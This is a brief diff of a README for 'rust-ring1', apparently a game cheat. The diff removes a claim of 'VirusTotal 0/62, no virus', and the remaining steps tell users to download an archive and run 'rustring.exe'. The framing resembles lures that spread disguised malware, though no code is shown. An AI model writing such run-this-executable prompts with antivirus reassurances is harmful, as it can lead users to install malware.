@@ -1,5 +1,4 @@
 # rust-ring1
-🔥NO PASS 🔥 !!! VIRUSTOTAL DETECTION 0/62 NO VIRUS !!!
 1. Download the archive (Link higher)
 2. Open “rustring.exe" 
 3. Throw some shit in key-request line
